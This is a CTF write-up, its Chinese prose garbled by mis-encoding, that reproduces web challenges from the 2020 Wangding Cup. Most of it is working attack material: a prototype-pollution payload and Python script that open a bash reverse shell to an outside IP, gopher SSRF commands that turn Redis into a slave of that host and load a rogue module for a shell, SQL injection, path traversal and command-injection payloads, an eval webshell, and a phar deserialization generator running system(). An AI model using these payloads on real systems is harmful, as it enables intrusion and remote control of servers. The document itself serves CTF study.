# 2020ç½‘é¼-å¤ç°

# åˆèµ›
## é’é¾™ç»„
### notes
#node-åŸå‹é“¾æ±¡æŸ“-undefsafe
```JS
var express = require('express');
var path = require('path');
const undefsafe = require('undefsafe');
const { exec } = require('child_process');


var app = express();
class Notes {
    constructor() {
        this.owner = "whoknows";
        this.num = 0;
        this.note_list = {};
    }

    write_note(author, raw_note) {
        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
    }

    get_note(id) {
        var r = {}
        undefsafe(r, id, undefsafe(this.note_list, id));
        return r;
    }

    edit_note(id, author, raw) {
        undefsafe(this.note_list, id + '.author', author);
        undefsafe(this.note_list, id + '.raw_note', raw);
    }

    get_all_notes() {
        return this.note_list;
    }

    remove_note(id) {
        delete this.note_list[id];
    }
}

var notes = new Notes();
notes.write_note("nobody", "this is nobody's first note");


app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'pug');

app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', function(req, res, next) {
  res.render('index', { title: 'Notebook' });
});

app.route('/add_note')
    .get(function(req, res) {
        res.render('mess', {message: 'please use POST to add a note'});
    })
    .post(function(req, res) {
        let author = req.body.author;
        let raw = req.body.raw;
        if (author && raw) {
            notes.write_note(author, raw);
            res.render('mess', {message: "add note sucess"});
        } else {
            res.render('mess', {message: "did not add note"});
        }
    })

app.route('/edit_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to edit a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        let author = req.body.author;
        let enote = req.body.raw;
        if (id && author && enote) {
            notes.edit_note(id, author, enote);
            res.render('mess', {message: "edit note sucess"});
        } else {
            res.render('mess', {message: "edit note failed"});
        }
    })

app.route('/delete_note')
    .get(function(req, res) {
        res.render('mess', {message: "please use POST to delete a note"});
    })
    .post(function(req, res) {
        let id = req.body.id;
        if (id) {
            notes.remove_note(id);
            res.render('mess', {message: "delete done"});
        } else {
            res.render('mess', {message: "delete failed"});
        }
    })

app.route('/notes')
    .get(function(req, res) {
        let q = req.query.q;
        let a_note;
        if (typeof(q) === "undefined") {
            a_note = notes.get_all_notes();
        } else {
            a_note = notes.get_note(q);
        }
        res.render('note', {list: a_note});
    })

app.route('/status')
    .get(function(req, res) {
        let commands = {
            "script-1": "uptime",
            "script-2": "free -m"
        };
        for (let index in commands) {
            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
                if (err) {
                    return;
                }
                console.log(`stdout: ${stdout}`);
            });
        }
        res.send('OK');
        res.end();
    })


app.use(function(req, res, next) {
  res.status(404).send('Sorry cant find that!');
});


app.use(function(err, req, res, next) {
  console.error(err.stack);
  res.status(500).send('Something broke!');
});


const port = 8080;
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))

```
undefsafe<2.03åŸå‹é“¾æ±¡æŸ“æ¼æ´
![](attachments/Pasted%20image%2020240331210434.png)

![](attachments/Pasted%20image%2020240331210548.png)
edit_note ä¼ å…¥`id=__proto__`,authorä¸ºæ±¡æŸ“çš„å†…å®¹
ç”±äº commands å’Œ note_list éƒ½ç»§æ‰¿è‡ªåŒä¸€ä¸ªåŸå‹ï¼Œé‚£ä¹ˆåœ¨éå† commands æ—¶ä¾¿ä¼šå–åˆ°æˆ‘ä»¬æ±¡æŸ“è¿›å»çš„æ¶æ„å‘½ä»¤å¹¶æ‰§è¡Œã€‚
payload
`id=__proto__&author=bash -i >& /dev/tcp/49.232.206.37/23456 0>&1&raw=wum0nster`
å‚æ•°ç›´æ¥ä¼ ä¼šæœ‰ä¸€äº›é—®é¢˜ç”¨postmanè·å–python
```PYTHON
import requests

url = "http://faccdaea-1505-4426-8438-9d245cbe7cab.node5.buuoj.cn:81/edit_note"

data= {
	"id": "__proto__",
	"author": "bash -i >& /dev/tcp/49.232.206.37/23456 0>&1",
	"raw": "wum0nster"
}

res = requests.post(url,data=data)
```

è®¿é—®/statusåå¼¹shell
![](attachments/Pasted%20image%2020240331212832.png)

## ç„æ­¦ç»„
### SSRFMe
```PHP
<?php  
functionÂ check_inner_ip($url)  
{Â Â Â Â $match_result=preg_match('/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/',$url);  
Â Â Â Â ifÂ (!$match_result)  
Â Â Â Â {  
Â Â Â Â Â Â Â Â die('urlÂ fomatÂ error');  
Â Â Â Â }  
Â Â Â Â try  
Â Â Â Â {Â Â Â Â Â Â Â Â $url_parse=parse_url($url);  
Â Â Â Â }  
Â Â Â Â catch(ExceptionÂ $e)  
Â Â Â Â {  
Â Â Â Â Â Â Â Â die('urlÂ fomatÂ error');  
Â Â Â Â Â Â Â Â returnÂ false;  
Â Â Â Â }Â Â Â Â $hostname=$url_parse['host'];Â Â Â Â $ip=gethostbyname($hostname);Â Â Â Â $int_ip=ip2long($ip);  
Â Â Â Â returnÂ ip2long('127.0.0.0')>>24Â ==Â $int_ip>>24Â ||Â ip2long('10.0.0.0')>>24Â ==Â $int_ip>>24Â ||Â ip2long('172.16.0.0')>>20Â ==Â $int_ip>>20Â ||Â ip2long('192.168.0.0')>>16Â ==Â $int_ip>>16;  
}  
  
functionÂ safe_request_url($url)  
{  
  
Â Â Â Â ifÂ (check_inner_ip($url))  
Â Â Â Â {  
Â Â Â Â Â Â Â Â echoÂ $url.'Â isÂ innerÂ ip';  
Â Â Â Â }  
Â Â Â Â else  
Â Â Â Â {Â Â Â Â Â Â Â Â $chÂ =Â curl_init();Â Â Â Â Â Â Â Â curl_setopt($ch,Â CURLOPT_URL,Â $url);Â Â Â Â Â Â Â Â curl_setopt($ch,Â CURLOPT_RETURNTRANSFER,Â 1);Â Â Â Â Â Â Â Â curl_setopt($ch,Â CURLOPT_HEADER,Â 0);Â Â Â Â Â Â Â Â $outputÂ =Â curl_exec($ch);Â Â Â Â Â Â Â Â $result_infoÂ =Â curl_getinfo($ch);  
Â Â Â Â Â Â Â Â ifÂ ($result_info['redirect_url'])  
Â Â Â Â Â Â Â Â {Â Â Â Â Â Â Â Â Â Â Â Â safe_request_url($result_info['redirect_url']);  
Â Â Â Â Â Â Â Â }Â Â Â Â Â Â Â Â curl_close($ch);Â Â Â Â Â Â Â Â var_dump($output);  
Â Â Â Â }  
  
}  
if(isset($_GET['url'])){Â Â Â Â $urlÂ =Â $_GET['url'];  
Â Â Â Â if(!empty($url)){Â Â Â Â Â Â Â Â safe_request_url($url);  
Â Â Â Â }  
}  
else{Â Â Â Â highlight_file(__FILE__);  
}  
//Â PleaseÂ visitÂ hint.phpÂ locally.  
?>
```


hint.php
```php
<?php   
if($_SERVER['REMOTE_ADDR']==="127.0.0.1"){Â Â 
	highlight_file(__FILE__);   
}   
if(isset($_POST['file'])){Â Â 
	file_put_contents($_POST['file'],"<?phpÂ echoÂ 'redispassÂ isÂ root';exit();".$_POST['file']);   
} 
```


```sh
gopher://0.0.0.0:6379/_auth root
config set dir /tmp/
quit
//è®¾ç½®å¤‡ä»½æ–‡ä»¶è·¯å¾„ä¸º/tmp/ é¡ºä¾¿è¯´ä¸€ä¸‹çœ‹åˆ°å½“æ—¶å¤§ä½¬çš„åšå®¢è¯´è¯•äº†å¾ˆå¤šç›®å½•ï¼Œæœ€åå‘ç°åªæœ‰/tmpæœ‰æƒé™ ï¼Œåªéœ€è¦æœ‰è¯»æƒé™å³å¯ï¼Œæ‰€ä»¥è¯´å¹³æ—¶åšæ¸—é€æˆ–è€…åšé¢˜å¥½å¤šè¯•è¯•å•Š

gopher://0.0.0.0:6379/_auth root
config set dbfilename exp.so
slaveof 49.232.206.37 21000
quit
//è®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºï¼šexp.soï¼Œè®¾ç½®ä¸»redisåœ°å€ä¸º49.232.206.37ï¼Œç«¯å£ä¸º21000 åœ°å€ä¸ºè‡ªå·±çš„VPS
gopher://0.0.0.0:6379/_auth root
module load /tmp/exp.so
system.rev 49.232.206.37 23456
quit
//å¯¼å…¥ exp.so ï¼Œåå¼¹shellåˆ°49.232.206.37:23456

```
## æœ±é›€ç»„

### Think Java

é¢˜ç›®æä¾›éƒ¨åˆ†æºç ï¼ŒSqlDict.classæœ‰æ˜æ˜¾çš„sqlæ³¨å…¥æ¼æ´
ğŸ’¡ jdbcç±»ä¼¼URLè§£æ

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package cn.abc.core.sqldict;

import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class SqlDict {
    public SqlDict() {
    }

    public static Connection getConnection(String dbName, String user, String pass) {
        Connection conn = null;

        try {
            Class.forName("com.mysql.jdbc.Driver");
            if (dbName != null && !dbName.equals("")) {
                dbName = "jdbc:mysql://mysqldbserver:3306/" + dbName;
            } else {
                dbName = "jdbc:mysql://mysqldbserver:3306/myapp";
            }

            if (user == null || dbName.equals("")) {
                user = "root";
            }

            if (pass == null || dbName.equals("")) {
                pass = "abc@12345";
            }

            conn = DriverManager.getConnection(dbName, user, pass);
        } catch (ClassNotFoundException var5) {
            var5.printStackTrace();
        } catch (SQLException var6) {
            var6.printStackTrace();
        }

        return conn;
    }

    public static List<Table> getTableData(String dbName, String user, String pass) {
        List<Table> Tables = new ArrayList();
        Connection conn = getConnection(dbName, user, pass);
        String TableName = "";

        try {
            Statement stmt = conn.createStatement();
            DatabaseMetaData metaData = conn.getMetaData();
            ResultSet tableNames = metaData.getTables((String)null, (String)null, (String)null, new String[]{"TABLE"});

            while(tableNames.next()) {
                TableName = tableNames.getString(3);
                Table table = new Table();
                String sql = "Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = '" + dbName + "' and table_name='" + TableName + "';";
                ResultSet rs = stmt.executeQuery(sql);

                while(rs.next()) {
                    table.setTableDescribe(rs.getString("TABLE_COMMENT"));
                }

                table.setTableName(TableName);
                ResultSet data = metaData.getColumns(conn.getCatalog(), (String)null, TableName, "");
                ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)null, TableName);

                String PK;
                for(PK = ""; rs2.next(); PK = rs2.getString(4)) {
                }

                while(data.next()) {
                    Row row = new Row(data.getString("COLUMN_NAME"), data.getString("TYPE_NAME"), data.getString("COLUMN_DEF"), data.getString("NULLABLE").equals("1") ? "YES" : "NO", data.getString("IS_AUTOINCREMENT"), data.getString("REMARKS"), data.getString("COLUMN_NAME").equals(PK) ? "true" : null, data.getString("COLUMN_SIZE"));
                    table.list.add(row);
                }

                Tables.add(table);
            }
        } catch (SQLException var16) {
            var16.printStackTrace();
        }

        return Tables;
    }
}
```


å‘ç°ä»£ç ä¸­å­˜åœ¨swagger api `import io.swagger.annotations.ApiOperation;`

è®¿é—®swagger-ui.html å­˜åœ¨

![](attachments/Pasted%20image%2020240830103152.png)


sqlæ³¨å…¥ä½ç½®åœ¨æ¥å£å¤„`myapp#' union select pwd from user#`

![](attachments/Pasted%20image%2020240830104556.png)

admin@Rrrr_ctf_asde

![](attachments/Pasted%20image%2020240830104824.png)

```json
{ "data": "Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu", "msg": "ç™»å½•æˆåŠŸ", "status": 2, "timestamps": 1724986090643 }
```

å¯¹javaåºåˆ—åŒ–æ•°æ®è¿›è¡Œè§£æ

```
java -jar .\SerializationDumper.jar aced000573720018636e2e6162632e636f72652e6d6f64656c2e55736572566f764643317b04f43a0200024c000269647400104c6a6176612f6c616e672f4c6f6e673b4c00046e616d657400124c6a6176612f6c616e672f537472696e673b78707372000e6a6176612e6c616e672e4c6f6e673b8be490cc8f23df0200014a000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b0200007870000000000000000174000561646d696e

STREAM_MAGIC - 0xac ed
STREAM_VERSION - 0x00 05
Contents
  TC_OBJECT - 0x73
    TC_CLASSDESC - 0x72
      className
        Length - 24 - 0x00 18
        Value - cn.abc.core.model.UserVo - 0x636e2e6162632e636f72652e6d6f64656c2e55736572566f
      serialVersionUID - 0x76 46 43 31 7b 04 f4 3a
      newHandle 0x00 7e 00 00
      classDescFlags - 0x02 - SC_SERIALIZABLE
      fieldCount - 2 - 0x00 02
      Fields
        0:
          Object - L - 0x4c
          fieldName
            Length - 2 - 0x00 02
            Value - id - 0x6964
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 01
              Length - 16 - 0x00 10
              Value - Ljava/lang/Long; - 0x4c6a6176612f6c616e672f4c6f6e673b
        1:
          Object - L - 0x4c
          fieldName
            Length - 4 - 0x00 04
            Value - name - 0x6e616d65
          className1
            TC_STRING - 0x74
              newHandle 0x00 7e 00 02
              Length - 18 - 0x00 12
              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
      classAnnotations
        TC_ENDBLOCKDATA - 0x78
      superClassDesc
        TC_NULL - 0x70
    newHandle 0x00 7e 00 03
    classdata
      cn.abc.core.model.UserVo
        values
          id
            (object)
              TC_OBJECT - 0x73
                TC_CLASSDESC - 0x72
                  className
                    Length - 14 - 0x00 0e
                    Value - java.lang.Long - 0x6a6176612e6c616e672e4c6f6e67
                  serialVersionUID - 0x3b 8b e4 90 cc 8f 23 df
                  newHandle 0x00 7e 00 04
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 1 - 0x00 01
                  Fields
                    0:
                      Long - L - 0x4a
                      fieldName
                        Length - 5 - 0x00 05
                        Value - value - 0x76616c7565
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_CLASSDESC - 0x72
                      className
                        Length - 16 - 0x00 10
                        Value - java.lang.Number - 0x6a6176612e6c616e672e4e756d626572
                      serialVersionUID - 0x86 ac 95 1d 0b 94 e0 8b
                      newHandle 0x00 7e 00 05
                      classDescFlags - 0x02 - SC_SERIALIZABLE
                      fieldCount - 0 - 0x00 00
                      classAnnotations
                        TC_ENDBLOCKDATA - 0x78
                      superClassDesc
                        TC_NULL - 0x70
                newHandle 0x00 7e 00 06
                classdata
                  java.lang.Number
                    values
                  java.lang.Long
                    values
                      value
                        (long)1 - 0x00 00 00 00 00 00 00 01
          name
            (object)
              TC_STRING - 0x74
                newHandle 0x00 7e 00 07
                Length - 5 - 0x00 05
                Value - admin - 0x61646d696e
```

![](attachments/Pasted%20image%2020240830105908.png)

èº«ä»½è®¤è¯å¤„ä¼ å…¥æ‹¿åˆ°çš„æ•°æ®åå®Œæˆäº†èº«ä»½è®¤è¯ï¼ŒçŒœæµ‹å­˜åœ¨ååºåˆ—åŒ–æ¼æ´

![](attachments/Pasted%20image%2020240830111459.png)

å­˜åœ¨romeé“¾



## ç™½è™ç»„
### PicDown
ç›´æ¥æ–‡ä»¶è¯»å–

```
page?url=../../../../flag
```
# åŠå†³èµ›
## AliceWebsite

æ¨æµ‹ä¸ºæ–‡ä»¶åŒ…å«

```php
<?php  
$action = (isset($_GET['action']) ? $_GET['action'] : 'home.php');  
if (file_exists($action)) {  
    include $action;  
} else {  
    echo "File not found!";  
}  
?>
```

![](attachments/Pasted%20image%2020240329191705.png)



![](attachments/Pasted%20image%2020240329191735.png)


## faka

sqlæ–‡ä»¶ä¸­ç»™äº†å¯†ç çš„md5å€¼

![](attachments/Pasted%20image%2020240402090037.png)

adminç™»å½•çš„æ ¡éªŒé€»è¾‘

![](attachments/Pasted%20image%2020240402085951.png)


![](attachments/Pasted%20image%2020240402090631.png)


`admincccbbb123`


ä»£ç å®¡è®¡åï¼Œå­˜åœ¨æ–‡ä»¶ä¸‹è½½ï¼Œä½†æ˜¯flagä¸åœ¨/flagä¸­

![](attachments/Pasted%20image%2020240402091444.png)

æœ‰æ–‡ä»¶ä¸Šä¼ 

![](attachments/Pasted%20image%2020240402092120.png)

å‰é¢é™åˆ¶äº†ä¸Šä¼ çš„æ–‡ä»¶åç¼€ï¼Œä½†æ˜¯åˆ°æ–‡ä»¶ä¸Šä¼ å¤„ç†çš„ä½ç½®moveå‡½æ•°

```PHP
public function move($path, $savename = true, $replace = true)  
{  
    // æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œæ•è·é”™è¯¯ä»£ç   
    if (!empty($this->info['error'])) {  
        $this->error($this->info['error']);  
        return false;  
    }  
  
    // æ£€æµ‹åˆæ³•æ€§  
    if (!$this->isValid()) {  
        $this->error = 'upload illegal files';  
        return false;  
    }  
  
    // éªŒè¯ä¸Šä¼   
    if (!$this->check()) {  
        return false;  
    }  
  
    $path = rtrim($path, DS) . DS;  
    // æ–‡ä»¶ä¿å­˜å‘½åè§„åˆ™  
    $saveName = $this->buildSaveName($savename);  
    $filename = $path . $saveName;  
  
    // æ£€æµ‹ç›®å½•  
    if (false === $this->checkPath(dirname($filename))) {  
        return false;  
    }  
  
    // ä¸è¦†ç›–åŒåæ–‡ä»¶  
    if (!$replace && is_file($filename)) {  
        $this->error = ['has the same filename: {:filename}', ['filename' => $filename]];  
        return false;  
    }  
  
    /* ç§»åŠ¨æ–‡ä»¶ */    if ($this->isTest) {  
        rename($this->filename, $filename);  
    } elseif (!move_uploaded_file($this->filename, $filename)) {  
        $this->error = 'upload write error';  
        return false;  
    }  
  
    // è¿”å› File å¯¹è±¡å®ä¾‹  
    $file = new self($filename);  
    $file->setSaveName($saveName)->setUploadInfo($this->info);  
  
    return $file;  
}
```

`$md5[1]`çš„å€¼ä¸ºæœ€åçš„æ–‡ä»¶åï¼Œè€Œå¯¹md5çš„ä¼ å‚æ˜¯æ²¡æœ‰æ£€æŸ¥å¾—åˆ°

checkå‡½æ•°æ£€æŸ¥äº†æ–‡ä»¶å¤´ï¼ŒåŠ ä¸Šå›¾ç‰‡å¤´ç»•è¿‡

```PHP
public function check($rule = [])  
{  
    $rule = $rule ?: $this->validate;  
  
    /* æ£€æŸ¥æ–‡ä»¶å¤§å° */    if (isset($rule['size']) && !$this->checkSize($rule['size'])) {  
        $this->error = 'filesize not match';  
        return false;  
    }  
  
    /* æ£€æŸ¥æ–‡ä»¶ Mime ç±»å‹ */    if (isset($rule['type']) && !$this->checkMime($rule['type'])) {  
        $this->error = 'mimetype to upload is not allowed';  
        return false;  
    }  
  
    /* æ£€æŸ¥æ–‡ä»¶åç¼€ */    if (isset($rule['ext']) && !$this->checkExt($rule['ext'])) {  
        $this->error = 'extensions to upload is not allowed';  
        return false;  
    }  
  
    /* æ£€æŸ¥å›¾åƒæ–‡ä»¶ */    if (!$this->checkImg()) {  
        $this->error = 'illegal image files';  
        return false;  
    }  
  
    return true;  
}
```


åœ¨ä¼ å‚è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„tokenå’Œkeyå€¼ç²˜è´´å³å¯

![](attachments/Pasted%20image%2020240402103221.png)

![](attachments/Pasted%20image%2020240402103233.png)

![](attachments/Pasted%20image%2020240402103246.png)


## BabyJS

![](attachments/Pasted%20image%2020240403082936.png)

å¯ä»¥å®Œæˆå¯¹`/tmp/log`çš„è¯»å’Œå†™ï¼Œè€ƒè™‘å‘½ä»¤æ³¨å…¥å°†flagæ³¨å…¥åˆ°logæ–‡ä»¶ä¸­å†è¯»å–
![](attachments/Pasted%20image%2020240403083740.png)


`echo 'cmd' >> /tmp/log`  åœ¨cmdå¤„æ’å…¥`';cp /flag /tmp/log;%00`


`@`å‰çš„ç”¨æˆ·åéƒ¨åˆ†ä¼šäºŒæ¬¡è§£ç 

![](attachments/Pasted%20image%2020240403085255.png)

å…«è¿›åˆ¶ç»•è¿‡æœ¬åœ°ip

payload
`http://0177.0.0.1:3000/debug?url=http://%2527@wum0nster;cp$IFS/flag$IFS/tmp/log;%00`

# æ€»å†³èµ›
## Novel

åœ¨back.class.php å°†å†…å®¹å­˜å‚¨ä¸ºäº†php

```PHP
public function backup($filename, $dest){  
    $filename='profile/'.$filename;  
    if(file_exists($filename)){  
       $content=htmlspecialchars(file_get_contents($filename),ENT_QUOTES);  
       $password=$this->random_code();  
       $r['path']=$this->_write($dest, $this->_create($password, $content));  
       $r['password']=$password;  
       echo json_encode($r);  
    }  
}  
  
/* å…ˆéªŒè¯ä¿è¯ä¸ºå¤‡ä»½æ–‡ä»¶å,å†ä¿å­˜ä¸ºç§è—æ–‡ä»¶ */
private function _write($dest, $content){  
    $f1=$dest;  
    $f2='private/'.$this->random_code(10).".php";  
  
    $stream_f1 = fopen($f1, 'w+');  
  
    fwrite($stream_f1, $content);  
    rewind($stream_f1);  
    $f1_read=fread($stream_f1, 3000);  
      
    preg_match('/^<\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s', $f1_read, $matches);  
      
    if(!empty($matches[0])){  
       copy($f1,$f2);  
       fclose($stream_f1);     
       return $f2;       
    }else{  
       fwrite($stream_f1, '<?php exit(); ?>');  
       fclose($stream_f1);  
       return false;  
    }  
  
}  
  
private function _create($password, $content){  
    $_content='<?php $_GET["password"]==="'.$password.'"?print("'.$content.'"):exit(); ';  
    return $_content;  
}
```

ç”¨phpçš„å¤æ‚è¯­æ³•bypass exitå®Œæˆå‘½ä»¤æ‰§è¡Œ

```
${eval($_POST[1])}
```

ä¸Šä¼ txtç§è—

![](attachments/Pasted%20image%2020240403160300.png)


![](attachments/Pasted%20image%2020240403160702.png)

![](attachments/Pasted%20image%2020240403160737.png)

## Game Exp
çŒœæµ‹ä¸ºååºåˆ—åŒ–

![](attachments/Pasted%20image%2020240403175308.png)

file_exists å¯ä»¥è§¦å‘pharï¼Œusernameå¯æ§
![](attachments/Pasted%20image%2020240403180935.png)

![](attachments/Pasted%20image%2020240403181815.png)

```PHP
<?php  
class AnyClass{  
    var $output = 'echo "ok";';  
}  
  
$o = new AnyClass();  
$o->output = 'system($_GET[0]);';  
  
$phar = new Phar("phar.jpg");  
$phar->startBuffering();  
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´  
$phar->setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest  
$phar->addFromString("test.txt", "test"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶  
$phar->stopBuffering();
```
æ„é€ usernameå³å¯è§¦å‘

![](attachments/Pasted%20image%2020240403182442.png)
